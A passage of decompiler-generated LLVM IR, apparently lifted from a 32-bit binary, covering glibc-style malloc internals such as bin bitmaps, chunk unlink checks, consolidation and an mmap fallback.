  br i1 %v10_8054074, label %dec_label_pc_8054065, label %dec_label_pc_8054079

dec_label_pc_8054079:                             ; preds = %dec_label_pc_8054065, %dec_label_pc_805405e
  %v0_8054079.lcssa = phi i32 [ %v3_8054043, %dec_label_pc_805405e ], [ %v3_8054069, %dec_label_pc_8054065 ]
  %v1_8054079 = add i32 %v0_8054079.lcssa, 12
  %v2_8054079 = inttoptr i32 %v1_8054079 to i32*
  %v3_8054079 = load i32, i32* %v2_8054079, align 4
  store i32 %v3_8054079, i32* @ebx, align 4
  br label %dec_label_pc_805407c

dec_label_pc_805407c:                             ; preds = %dec_label_pc_8054022, %dec_label_pc_8054050, %dec_label_pc_8054033, %dec_label_pc_8054079
  %v0_805407c = phi i32 [ %v0_8054035, %dec_label_pc_8054033 ], [ %v0_8054035, %dec_label_pc_8054079 ], [ %v0_8054035, %dec_label_pc_8054050 ], [ %v2_8054024, %dec_label_pc_8054022 ]
  %stack_var_-64.1 = phi i32 [ %v3_8054043, %dec_label_pc_8054033 ], [ %v0_8054079.lcssa, %dec_label_pc_8054079 ], [ %v2_805403c, %dec_label_pc_8054050 ], [ %v3_805402e, %dec_label_pc_8054022 ]
  %v1_805407e = urem i32 %v0_805407c, 32
  %v2_805407e = icmp eq i32 %v1_805407e, 0
  store i32 %v1_805407e, i32* %esi.global-to-local, align 4
  store i32 %v1_805407e, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8054088 = sdiv i32 %v0_805407c, 32
  store i32 %v2_8054088, i32* %edx.global-to-local, align 4
  br i1 %v2_805407e, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_805407c
  %v5_805408b = shl i32 1, %v1_805407e
  store i32 %v5_805408b, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_805407c, %bb
  %v5_805408d = phi i32 [ 1, %dec_label_pc_805407c ], [ %v5_805408b, %bb ]
  %v1_805408d = mul nsw i32 %v2_8054088, 4
  %v2_805408d = add i32 %v1_805408d, ptrtoint (i32* @global_var_8064ad4.527 to i32)
  %v3_805408d = inttoptr i32 %v2_805408d to i32*
  %v4_805408d = load i32, i32* %v3_805408d, align 4
  %v6_805408d = or i32 %v4_805408d, %v5_805408d
  store i32 %v6_805408d, i32* %v3_805408d, align 4
  %v0_8054094 = load i32, i32* @ebx, align 4
  %v1_8054094 = load i32, i32* @ebp, align 4
  %v2_8054094 = add i32 %v1_8054094, 12
  %v3_8054094 = inttoptr i32 %v2_8054094 to i32*
  store i32 %v0_8054094, i32* %v3_8054094, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_805409b = load i32, i32* @ebp, align 4
  %v2_805409b = add i32 %v1_805409b, 8
  %v3_805409b = inttoptr i32 %v2_805409b to i32*
  store i32 %stack_var_-64.1, i32* %v3_805409b, align 4
  %v0_805409e = load i32, i32* @ebp, align 4
  %v1_805409e = load i32, i32* @esi, align 4
  %v2_805409e = add i32 %v1_805409e, 12
  %v3_805409e = inttoptr i32 %v2_805409e to i32*
  store i32 %v0_805409e, i32* %v3_805409e, align 4
  %v0_80540a1 = load i32, i32* @ebp, align 4
  %v1_80540a1 = load i32, i32* @ebx, align 4
  %v2_80540a1 = add i32 %v1_80540a1, 8
  %v3_80540a1 = inttoptr i32 %v2_80540a1 to i32*
  store i32 %v0_80540a1, i32* %v3_80540a1, align 4
  %v0_80540a4 = load i32, i32* @global_var_80647e0.526, align 32
  store i32 %v0_80540a4, i32* @ebp, align 4
  %v9_80540aa = icmp eq i32 %v0_80540a4, 134629332
  %v1_80540b0 = icmp eq i1 %v9_80540aa, false
  br i1 %v1_80540b0, label %dec_label_pc_8053fd3, label %dec_label_pc_80540b6

dec_label_pc_80540b6:                             ; preds = %bb82, %dec_label_pc_80540a4.preheader
  br i1 %v8_8053f67, label %dec_label_pc_8054144, label %dec_label_pc_80540c4

dec_label_pc_80540c4:                             ; preds = %dec_label_pc_80540b6
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_80540c8 = mul i32 %stack_var_-40.0.ph, 8
  %v2_80540c8 = add i32 %v1_80540c8, ptrtoint (i32* @global_var_80647cc.523 to i32)
  store i32 %v2_80540c8, i32* %edx.global-to-local, align 4
  %v1_80540cf = add i32 %v1_80540c8, add (i32 ptrtoint (i32* @global_var_80647cc.523 to i32), i32 12)
  %v2_80540cf = inttoptr i32 %v1_80540cf to i32*
  %storemerge1.pre = load i32, i32* %v2_80540cf, align 4
  br label %dec_label_pc_8054140

dec_label_pc_80540d4:                             ; preds = %dec_label_pc_8054140
  %v1_80540d4 = add i32 %v4_80540eb, 4
  %v2_80540d4 = inttoptr i32 %v1_80540d4 to i32*
  %v3_80540d4 = load i32, i32* %v2_80540d4, align 4
  store i32 %v3_80540d4, i32* %ebx.global-to-local, align 4
  %v1_80540d7 = add i32 %v4_80540eb, 12
  %v2_80540d7 = inttoptr i32 %v1_80540d7 to i32*
  %v3_80540d7 = load i32, i32* %v2_80540d7, align 4
  store i32 %v3_80540d7, i32* @ecx, align 4
  %v1_80540da = and i32 %v3_80540d4, -4
  store i32 %v1_80540da, i32* @ebx, align 4
  %v10_80540dd = icmp ult i32 %v1_80540da, %v1_80542be
  br i1 %v10_80540dd, label %dec_label_pc_8054140, label %dec_label_pc_80540e3

dec_label_pc_80540e3:                             ; preds = %dec_label_pc_80540d4
  %v1_80540e3 = add i32 %v4_80540eb, 8
  %v2_80540e3 = inttoptr i32 %v1_80540e3 to i32*
  %v3_80540e3 = load i32, i32* %v2_80540e3, align 4
  store i32 %v3_80540e3, i32* @edx, align 4
  %v1_80540e6 = add i32 %v3_80540e3, 12
  %v2_80540e6 = inttoptr i32 %v1_80540e6 to i32*
  %v3_80540e6 = load i32, i32* %v2_80540e6, align 4
  %v15_80540e6 = icmp eq i32 %v3_80540e6, %v4_80540eb
  %v1_80540e9 = icmp eq i1 %v15_80540e6, false
  br i1 %v1_80540e9, label %dec_label_pc_80540f0, label %dec_label_pc_80540eb

dec_label_pc_80540eb:                             ; preds = %dec_label_pc_80540e3
  %v1_80540eb = add i32 %v3_80540d7, 8
  %v2_80540eb = inttoptr i32 %v1_80540eb to i32*
  %v3_80540eb = load i32, i32* %v2_80540eb, align 4
  %v15_80540eb = icmp eq i32 %v3_80540eb, %v4_80540eb
  br i1 %v15_80540eb, label %dec_label_pc_80540f5, label %dec_label_pc_80540f0

dec_label_pc_80540f0:                             ; preds = %dec_label_pc_80540eb, %dec_label_pc_80540e3
  %v0_80540f0 = call i32 @abort()
  store i32 %v0_80540f0, i32* %eax.global-to-local, align 4
  %v0_80540f5.pre = load i32, i32* @ebx, align 4
  %v0_80540fb.pre = load i32, i32* @ecx, align 4
  %v1_80540fb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80540f5

dec_label_pc_80540f5:                             ; preds = %dec_label_pc_80540eb, %dec_label_pc_80540f0
  %v1_80540fb = phi i32 [ %v3_80540e3, %dec_label_pc_80540eb ], [ %v1_80540fb.pre, %dec_label_pc_80540f0 ]
  %v0_80540fb = phi i32 [ %v3_80540d7, %dec_label_pc_80540eb ], [ %v0_80540fb.pre, %dec_label_pc_80540f0 ]
  %v0_80540f5 = phi i32 [ %v1_80540da, %dec_label_pc_80540eb ], [ %v0_80540f5.pre, %dec_label_pc_80540f0 ]
  %v5_80540f7 = sub i32 %v0_80540f5, %v1_80542be
  store i32 %v5_80540f7, i32* %esi.global-to-local, align 4
  %v2_80540fb = add i32 %v1_80540fb, 12
  %v3_80540fb = inttoptr i32 %v2_80540fb to i32*
  store i32 %v0_80540fb, i32* %v3_80540fb, align 4
  %v0_80540fe = load i32, i32* @edx, align 4
  %v1_80540fe = load i32, i32* @ecx, align 4
  %v2_80540fe = add i32 %v1_80540fe, 8
  %v3_80540fe = inttoptr i32 %v2_80540fe to i32*
  store i32 %v0_80540fe, i32* %v3_80540fe, align 4
  %v0_8054101 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054101 = add i32 %v0_8054101, 8
  store i32 %v1_8054101, i32* @ecx, align 4
  %v0_8054104 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_8054104, 16
  br i1 %tmp137, label %dec_label_pc_8054633, label %dec_label_pc_805410d

dec_label_pc_805410d:                             ; preds = %dec_label_pc_80540f5
  %v2_8054111 = add i32 %v0_8054101, %v1_80542be
  store i32 %v2_8054111, i32* @edx, align 4
  %v1_8054114 = or i32 %v1_80542be, 1
  store i32 %v1_8054114, i32* %ebx.global-to-local, align 4
  %v2_8054117 = add i32 %v0_8054101, 4
  %v3_8054117 = inttoptr i32 %v2_8054117 to i32*
  store i32 %v1_8054114, i32* %v3_8054117, align 4
  %v0_805411a = load i32, i32* %esi.global-to-local, align 4
  %v1_805411c = or i32 %v0_805411a, 1
  store i32 %v1_805411c, i32* %eax.global-to-local, align 4
  %v0_805411f = load i32, i32* @edx, align 4
  %v1_805411f = load i32, i32* @ebp, align 4
  %v2_805411f = add i32 %v1_805411f, 8
  %v3_805411f = inttoptr i32 %v2_805411f to i32*
  store i32 %v0_805411f, i32* %v3_805411f, align 4
  %v0_8054122 = load i32, i32* @edx, align 4
  %v1_8054122 = load i32, i32* @ebp, align 4
  %v2_8054122 = add i32 %v1_8054122, 12
  %v3_8054122 = inttoptr i32 %v2_8054122 to i32*
  store i32 %v0_8054122, i32* %v3_8054122, align 4
  %v0_8054125 = load i32, i32* @edx, align 4
  %v1_8054125 = add i32 %v0_8054125, 8
  %v2_8054125 = inttoptr i32 %v1_8054125 to i32*
  store i32 ptrtoint (i32* @global_var_80647d4.525 to i32), i32* %v2_8054125, align 4
  %v0_805412c = load i32, i32* @edx, align 4
  %v1_805412c = add i32 %v0_805412c, 12
  %v2_805412c = inttoptr i32 %v1_805412c to i32*
  store i32 ptrtoint (i32* @global_var_80647d4.525 to i32), i32* %v2_805412c, align 4
  %v0_8054133 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054133 = load i32, i32* @edx, align 4
  %v2_8054133 = add i32 %v1_8054133, 4
  %v3_8054133 = inttoptr i32 %v2_8054133 to i32*
  store i32 %v0_8054133, i32* %v3_8054133, align 4
  %v0_8054136 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054136 = load i32, i32* @edx, align 4
  %v3_8054136 = add i32 %v1_8054136, %v0_8054136
  %v4_8054136 = inttoptr i32 %v3_8054136 to i32*
  store i32 %v0_8054136, i32* %v4_8054136, align 4
  br label %dec_label_pc_8054638

dec_label_pc_8054140:                             ; preds = %dec_label_pc_80540d4, %dec_label_pc_80540c4
  %v4_80540eb = phi i32 [ %storemerge1.pre, %dec_label_pc_80540c4 ], [ %v3_80540d7, %dec_label_pc_80540d4 ]
  store i32 %v4_80540eb, i32* %eax.global-to-local, align 4
  %v12_8054140 = icmp eq i32 %v4_80540eb, %v2_80540c8
  %v1_8054142 = icmp eq i1 %v12_8054140, false
  br i1 %v1_8054142, label %dec_label_pc_80540d4, label %dec_label_pc_8054144.loopexit

dec_label_pc_8054144.loopexit:                    ; preds = %dec_label_pc_8054140
  br label %dec_label_pc_8054144

dec_label_pc_8054144:                             ; preds = %dec_label_pc_8054144.loopexit, %dec_label_pc_80540b6
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805414d = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_805414d, i32* %ecx.global-to-local, align 4
  %v2_8054150 = udiv i32 %v1_805414d, 32
  store i32 %v2_8054150, i32* @edi, align 4
  %v1_8054153 = mul nuw nsw i32 %v2_8054150, 4
  %v2_8054153 = add i32 %v1_8054153, ptrtoint (i32* @global_var_8064ad4.527 to i32)
  %v3_8054153 = inttoptr i32 %v2_8054153 to i32*
  %v4_8054153 = load i32, i32* %v3_8054153, align 4
  store i32 %v4_8054153, i32* %edx.global-to-local, align 4
  %v1_805415a = mul i32 %v1_805414d, 8
  %v2_805415a = add i32 %v1_805415a, ptrtoint (i32* @global_var_80647cc.523 to i32)
  store i32 %v2_805415a, i32* %ebx.global-to-local, align 4
  %v1_8054161 = urem i32 %v1_805414d, 32
  %v2_8054161 = icmp eq i32 %v1_8054161, 0
  store i32 %v1_8054161, i32* %ecx.global-to-local, align 4
  br i1 %v2_8054161, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_8054144
  %v5_8054164 = shl i32 1, %v1_8054161
  store i32 %v5_8054164, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8054144, %bb83, %dec_label_pc_80541a5
  %v1_8054166 = phi i32 [ %v1_8054166.pre, %dec_label_pc_80541a5 ], [ %v4_8054153, %bb83 ], [ %v4_8054153, %dec_label_pc_8054144 ]
  %v0_805416a = phi i32 [ %v0_8054166.pre, %dec_label_pc_80541a5 ], [ %v5_8054164, %bb83 ], [ 1, %dec_label_pc_8054144 ]
  %tmp84 = icmp ule i32 %v0_805416a, %v1_8054166
  %v1_805416a = icmp eq i32 %v0_805416a, 0
  %v1_805416c = icmp eq i1 %v1_805416a, false
  %or.cond = and i1 %tmp84, %v1_805416c
  br i1 %or.cond, label %dec_label_pc_805416a.dec_label_pc_805419a.preheader_crit_edge, label %dec_label_pc_805416e.preheader

dec_label_pc_805416a.dec_label_pc_805419a.preheader_crit_edge: ; preds = %.preheader
  %v0_805419512.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805419a.preheader

dec_label_pc_805416e.preheader:                   ; preds = %.preheader
  %v0_805416e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805416e

dec_label_pc_805416e:                             ; preds = %dec_label_pc_805416e.preheader, %dec_label_pc_8054178
  %v0_805416e = phi i32 [ %v0_805416e.pre, %dec_label_pc_805416e.preheader ], [ %v1_805416e, %dec_label_pc_8054178 ]
  %v1_805416e = add i32 %v0_805416e, 1
  store i32 %v1_805416e, i32* @edi, align 4
  %v6_8054172 = icmp ugt i32 %v1_805416e, 2
  br i1 %v6_8054172, label %dec_label_pc_8054229.loopexit, label %dec_label_pc_8054178

dec_label_pc_8054178:                             ; preds = %dec_label_pc_805416e
  %v1_8054178 = mul i32 %v1_805416e, 4
  %v2_8054178 = add i32 %v1_8054178, ptrtoint (i32* @global_var_8064ad4.527 to i32)
  %v3_8054178 = inttoptr i32 %v2_8054178 to i32*
  %v4_8054178 = load i32, i32* %v3_8054178, align 4
  store i32 %v4_8054178, i32* %edx.global-to-local, align 4
  %v1_805417f = icmp eq i32 %v4_8054178, 0
  br i1 %v1_805417f, label %dec_label_pc_805416e, label %dec_label_pc_8054183

dec_label_pc_8054183:                             ; preds = %dec_label_pc_8054178
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_805418a = mul i32 %v1_805416e, 256
  store i32 %v2_805418a, i32* %eax.global-to-local, align 4
  %v1_805418d = add i32 %v2_805418a, ptrtoint (i32* @global_var_80647cc.523 to i32)
  store i32 %v1_805418d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805419a.preheader

dec_label_pc_805419a.preheader:                   ; preds = %dec_label_pc_805416a.dec_label_pc_805419a.preheader_crit_edge, %dec_label_pc_8054183
  %v0_805419512 = phi i32 [ %v1_805418d, %dec_label_pc_8054183 ], [ %v0_805419512.pre, %dec_label_pc_805416a.dec_label_pc_805419a.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8054183 ], [ %v0_805416a, %dec_label_pc_805416a.dec_label_pc_805419a.preheader_crit_edge ]
  %v0_80541ab = phi i32 [ %v4_8054178, %dec_label_pc_8054183 ], [ %v1_8054166, %dec_label_pc_805416a.dec_label_pc_805419a.preheader_crit_edge ]
  %v2_805419a4 = and i32 %v0_80541ab, %esi.promoted
  %v3_805419a5 = icmp eq i32 %v2_805419a4, 0
  br i1 %v3_805419a5, label %dec_label_pc_8054195, label %dec_label_pc_805419e

dec_label_pc_8054195:                             ; preds = %dec_label_pc_805419a.preheader, %dec_label_pc_8054195
  %v2_805419814 = phi i32 [ %v2_8054198, %dec_label_pc_8054195 ], [ %esi.promoted, %dec_label_pc_805419a.preheader ]
  %v0_805419513 = phi i32 [ %v1_8054195, %dec_label_pc_8054195 ], [ %v0_805419512, %dec_label_pc_805419a.preheader ]
  %v1_8054195 = add i32 %v0_805419513, 8
  %v2_8054198 = mul i32 %v2_805419814, 2
  %v2_805419a = and i32 %v2_8054198, %v0_80541ab
  %v3_805419a = icmp eq i32 %v2_805419a, 0
  br i1 %v3_805419a, label %dec_label_pc_8054195, label %dec_label_pc_805419a.dec_label_pc_805419e_crit_edge

dec_label_pc_805419a.dec_label_pc_805419e_crit_edge: ; preds = %dec_label_pc_8054195
  store i32 %v1_8054195, i32* %ebx.global-to-local, align 4
  store i32 %v2_8054198, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805419e

dec_label_pc_805419e:                             ; preds = %dec_label_pc_805419a.dec_label_pc_805419e_crit_edge, %dec_label_pc_805419a.preheader
  %v0_80541a5 = phi i32 [ %v2_8054198, %dec_label_pc_805419a.dec_label_pc_805419e_crit_edge ], [ %esi.promoted, %dec_label_pc_805419a.preheader ]
  %v1_80541c8 = phi i32 [ %v1_8054195, %dec_label_pc_805419a.dec_label_pc_805419e_crit_edge ], [ %v0_805419512, %dec_label_pc_805419a.preheader ]
  %v1_805419e = add i32 %v1_80541c8, 12
  %v2_805419e = inttoptr i32 %v1_805419e to i32*
  %v3_805419e = load i32, i32* %v2_805419e, align 4
  store i32 %v3_805419e, i32* @ecx, align 4
  %v12_80541a1 = icmp eq i32 %v3_805419e, %v1_80541c8
  %v1_80541a3 = icmp eq i1 %v12_80541a1, false
  br i1 %v1_80541a3, label %dec_label_pc_80541b9, label %dec_label_pc_80541a5

dec_label_pc_80541a5:                             ; preds = %dec_label_pc_805419e
  %v2_80541a7 = mul i32 %v0_80541a5, 2
  store i32 %v2_80541a7, i32* %esi.global-to-local, align 4
  %v1_80541a9 = sub i32 -1, %v0_80541a5
  store i32 %v1_80541a9, i32* %eax.global-to-local, align 4
  %v2_80541ab = and i32 %v0_80541ab, %v1_80541a9
  store i32 %v2_80541ab, i32* %edx.global-to-local, align 4
  %v1_80541ad = add i32 %v3_805419e, 8
  store i32 %v1_80541ad, i32* %ebx.global-to-local, align 4
  %v1_80541b0 = load i32, i32* @edi, align 4
  %v2_80541b0 = mul i32 %v1_80541b0, 4
  %v3_80541b0 = add i32 %v2_80541b0, ptrtoint (i32* @global_var_8064ad4.527 to i32)
  %v4_80541b0 = inttoptr i32 %v3_80541b0 to i32*
  store i32 %v2_80541ab, i32* %v4_80541b0, align 4
  %v0_8054166.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8054166.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_80541b9:                             ; preds = %dec_label_pc_805419e
  %v1_80541b9 = add i32 %v3_805419e, 4
  %v2_80541b9 = inttoptr i32 %v1_80541b9 to i32*
  %v3_80541b9 = load i32, i32* %v2_80541b9, align 4
  store i32 %v3_80541b9, i32* %edx.global-to-local, align 4
  %v1_80541bc = add i32 %v3_805419e, 12
  %v2_80541bc = inttoptr i32 %v1_80541bc to i32*
  %v3_80541bc = load i32, i32* %v2_80541bc, align 4
  store i32 %v3_80541bc, i32* %eax.global-to-local, align 4
  %v1_80541bf = and i32 %v3_80541b9, -4
  store i32 %v1_80541bf, i32* @edx, align 4
  %v5_80541c4 = sub i32 %v1_80541bf, %v1_80542be
  store i32 %v5_80541c4, i32* %esi.global-to-local, align 4
  store i32 %v3_80541bc, i32* %v2_805419e, align 4
  %v0_80541cb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80541cb = load i32, i32* %eax.global-to-local, align 4
  %v2_80541cb = add i32 %v1_80541cb, 8
  %v3_80541cb = inttoptr i32 %v2_80541cb to i32*
  store i32 %v0_80541cb, i32* %v3_80541cb, align 4
  %v0_80541ce = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_80541ce, 16
  %v0_80541d3 = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_80541d3, label %dec_label_pc_80541da

dec_label_pc_80541d3:                             ; preds = %dec_label_pc_80541b9
  %v1_80541d3 = load i32, i32* @edx, align 4
  %v2_80541d3 = add i32 %v0_80541d3, 4
  %v3_80541d3 = add i32 %v2_80541d3, %v1_80541d3
  %v4_80541d3 = inttoptr i32 %v3_80541d3 to i32*
  %v5_80541d3 = load i32, i32* %v4_80541d3, align 4
  %v6_80541d3 = or i32 %v5_80541d3, 1
  store i32 %v6_80541d3, i32* %v4_80541d3, align 4
  br label %dec_label_pc_8054221

dec_label_pc_80541da:                             ; preds = %dec_label_pc_80541b9
  %v2_80541de = add i32 %v0_80541d3, %v1_80542be
  store i32 %v2_80541de, i32* %eax.global-to-local, align 4
  %v1_80541e7 = load i32, i32* @ebp, align 4
  %v2_80541e7 = add i32 %v1_80541e7, 8
  %v3_80541e7 = inttoptr i32 %v2_80541e7 to i32*
  store i32 %v2_80541de, i32* %v3_80541e7, align 4
  %v0_80541ea = load i32, i32* %eax.global-to-local, align 4
  %v1_80541ea = load i32, i32* @ebp, align 4
  %v2_80541ea = add i32 %v1_80541ea, 12
  %v3_80541ea = inttoptr i32 %v2_80541ea to i32*
  store i32 %v0_80541ea, i32* %v3_80541ea, align 4
  %v0_80541ed = load i32, i32* %eax.global-to-local, align 4
  %v1_80541ed = add i32 %v0_80541ed, 8
  %v2_80541ed = inttoptr i32 %v1_80541ed to i32*
  store i32 ptrtoint (i32* @global_var_80647d4.525 to i32), i32* %v2_80541ed, align 4
  %v0_80541f4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80541f4 = add i32 %v0_80541f4, 12
  %v2_80541f4 = inttoptr i32 %v1_80541f4 to i32*
  store i32 ptrtoint (i32* @global_var_80647d4.525 to i32), i32* %v2_80541f4, align 4
  %v0_80541fb = load i32, i32* @global_var_80647d0.524, align 16
  %v4_8054201 = load i32, i32* %eax.global-to-local, align 4
  %v5_8054201 = select i1 %v8_8053f67, i32 %v4_8054201, i32 %v0_80541fb
  %v4_8054204 = or i32 %v1_80542be, 1
  store i32 %v5_8054201, i32* @global_var_80647d0.524, align 16
  %v0_805420f = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8054204, i32* %ebx.global-to-local, align 4
  %v1_8054215 = or i32 %v0_805420f, 1
  store i32 %v1_8054215, i32* @edx, align 4
  %v3_8054218 = add i32 %v0_805420f, %v4_8054201
  %v4_8054218 = inttoptr i32 %v3_8054218 to i32*
  store i32 %v0_805420f, i32* %v4_8054218, align 4
  %v0_805421b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805421b = load i32, i32* @ecx, align 4
  %v2_805421b = add i32 %v1_805421b, 4
  %v3_805421b = inttoptr i32 %v2_805421b to i32*
  store i32 %v0_805421b, i32* %v3_805421b, align 4
  %v0_805421e = load i32, i32* @edx, align 4
  %v1_805421e = load i32, i32* %eax.global-to-local, align 4
  %v2_805421e = add i32 %v1_805421e, 4
  %v3_805421e = inttoptr i32 %v2_805421e to i32*
  store i32 %v0_805421e, i32* %v3_805421e, align 4
  br label %dec_label_pc_8054221

dec_label_pc_8054221:                             ; preds = %dec_label_pc_8054315, %dec_label_pc_80541d3, %dec_label_pc_80541da
  %v0_8054221 = load i32, i32* @ecx, align 4
  %v1_8054221 = add i32 %v0_8054221, 8
  store i32 %v1_8054221, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054649

dec_label_pc_8054229.loopexit:                    ; preds = %dec_label_pc_805416e
  br label %dec_label_pc_8054229

dec_label_pc_8054229:                             ; preds = %dec_label_pc_8054229.loopexit, %dec_label_pc_8053f29, %dec_label_pc_8053f31
  %v0_8054229 = load i32, i32* @global_var_80647cc.523, align 4
  store i32 %v0_8054229, i32* @ebx, align 4
  store i32 %v1_80542be, i32* %esi.global-to-local, align 4
  %v1_8054233 = add i32 %v0_8054229, 4
  %v2_8054233 = inttoptr i32 %v1_8054233 to i32*
  %v3_8054233 = load i32, i32* %v2_8054233, align 4
  %v1_8054236 = add i32 %v1_80542be, 16
  store i32 %v1_8054236, i32* @esi, align 4
  %v1_805423d = and i32 %v3_8054233, -4
  store i32 %v1_805423d, i32* %ecx.global-to-local, align 4
  %v7_8054240 = icmp ult i32 %v1_805423d, %v1_8054236
  br i1 %v7_8054240, label %dec_label_pc_8054260, label %dec_label_pc_8054244

dec_label_pc_8054244:                             ; preds = %dec_label_pc_8054229
  %v2_8054248 = add i32 %v0_8054229, %v1_80542be
  store i32 %v2_8054248, i32* @edx, align 4
  %v1_805424b = or i32 %v1_80542be, 1
  store i32 %v1_805424b, i32* %eax.global-to-local, align 4
  store i32 %v2_8054248, i32* @global_var_80647cc.523, align 4
  store i32 %v1_805424b, i32* %v2_8054233, align 4
  %v0_8054257 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8054257 = sub i32 %v0_8054257, %v1_80542be
  store i32 %v5_8054257, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80545d9

dec_label_pc_8054260:                             ; preds = %dec_label_pc_8054229
  %v0_8054260 = load i8, i8* @global_var_80647a0.522, align 32
  %v1_8054260 = and i8 %v0_8054260, 2
  %v2_8054260 = icmp eq i8 %v1_8054260, 0
  %v0_8054267 = load i32, i32* @global_var_8064afc.528, align 4
  store i32 %v0_8054267, i32* %edx.global-to-local, align 4
  br i1 %v2_8054260, label %dec_label_pc_8054294, label %dec_label_pc_805426f

dec_label_pc_805426f:                             ; preds = %dec_label_pc_8054260
  store i32 ptrtoint (i8* @global_var_80647a0.522 to i32), i32* %stack_var_-92, align 4
  %v2_8054277 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80647a0.522 to i32*))
  store i32 ptrtoint (i8* @global_var_80647a0.522 to i32), i32* @ebx, align 4
  %v1_8054281 = add i32 %v1_80542be, -7
  store i32 %v1_8054281, i32* %eax.global-to-local, align 4
  store i32 %v1_8054281, i32* %stack_var_-92, align 4
  %v1_8054285 = call i32 @malloc(i32 %v1_8054281)
  store i32 %v1_8054285, i32* %eax.global-to-local, align 4
  store i32 %v1_8054285, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054649

dec_label_pc_8054294:                             ; preds = %dec_label_pc_8054260
  store i32 %v1_80542be, i32* @ebx, align 4
  %v1_8054298 = add i32 %v0_8054267, -1
  store i32 %v1_8054298, i32* @ecx, align 4
  %v1_805429b = load i32, i32* @global_var_8064aec.529, align 4
  %v7_805429b = icmp ult i32 %v1_80542be, %v1_805429b
  br i1 %v7_805429b, label %dec_label_pc_8054376, label %dec_label_pc_80542ab

dec_label_pc_80542ab:                             ; preds = %dec_label_pc_8054294
  %v0_80542ab = load i32, i32* @global_var_8064af0.530, align 16
  store i32 %v0_80542ab, i32* %eax.global-to-local, align 4
  %v1_80542b0 = load i32, i32* @global_var_8064af4.531, align 4
  %v5_80542b6 = icmp slt i32 %v0_80542ab, %v1_80542b0
  br i1 %v5_80542b6, label %dec_label_pc_80542bc, label %dec_label_pc_8054376

dec_label_pc_80542bc:                             ; preds = %dec_label_pc_80542ab
  %v2_80542be = add i32 %v1_80542be, 10
  %v3_80542be = add i32 %v2_80542be, %v0_8054267
  %v1_80542c2 = sub i32 0, %v0_8054267
  store i32 %v1_80542c2, i32* %eax.global-to-local, align 4
  %v2_80542c4 = and i32 %v3_80542be, %v1_80542c2
  store i32 %v2_80542c4, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_80542c4, %v1_80542be
  br i1 %tmp139, label %dec_label_pc_80542d0, label %dec_label_pc_8054376

dec_label_pc_80542d0:                             ; preds = %dec_label_pc_80542bc
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80542dd = call i32 @mmap(i32 0, i32 %v2_80542c4, i32 3, i32 34, i32 0, i32 0, i32 %v1_8054298, i32 %v1_8054298)
  store i32 %v8_80542dd, i32* %eax.global-to-local, align 4
  %v10_80542e5 = icmp eq i32 %v8_80542dd, -1
  store i32 %v8_80542dd, i32* %edx.global-to-local, align 4
  br i1 %v10_80542e5, label %dec_label_pc_80542d0.dec_label_pc_8054376_crit_edge, label %dec_label_pc_80542f0

dec_label_pc_80542d0.dec_label_pc_8054376_crit_edge: ; preds = %dec_label_pc_80542d0
  %v0_8054376.pre = load i32, i32* @global_var_80647cc.523, align 4
  br label %dec_label_pc_8054376

dec_label_pc_80542f0:                             ; preds = %dec_label_pc_80542d0
  %v1_80542f2 = urem i32 %v8_80542dd, 8
  %v2_80542f2 = icmp eq i32 %v1_80542f2, 0
  store i32 %v1_80542f2, i32* %ecx.global-to-local, align 4
  br i1 %v2_80542f2, label %dec_label_pc_805430b, label %dec_label_pc_80542f7

dec_label_pc_80542f7:                             ; preds = %dec_label_pc_80542f0
  %v0_80542fc = load i32, i32* @ebx, align 4
  %v2_80542fe = sub nsw i32 8, %v1_80542f2
  store i32 %v2_80542fe, i32* %eax.global-to-local, align 4
  %v2_8054300 = add i32 %v2_80542fe, %v8_80542dd
  store i32 %v2_8054300, i32* @ecx, align 4
  %v2_8054303 = sub i32 %v0_80542fc, %v2_80542fe
  store i32 %v2_8054303, i32* %esi.global-to-local, align 4
  %v2_8054305 = inttoptr i32 %v2_8054300 to i32*
  store i32 %v2_80542fe, i32* %v2_8054305, align 4
  br label %dec_label_pc_8054315

dec_label_pc_805430b:                             ; preds = %dec_label_pc_80542f0
  store i32 %v8_80542dd, i32* @ecx, align 4
  %v1_805430d = inttoptr i32 %v8_80542dd to i32*
  store i32 0, i32* %v1_805430d, align 4
  br label %dec_label_pc_8054315

dec_label_pc_8054315:                             ; preds = %dec_label_pc_80542f7, %dec_label_pc_805430b
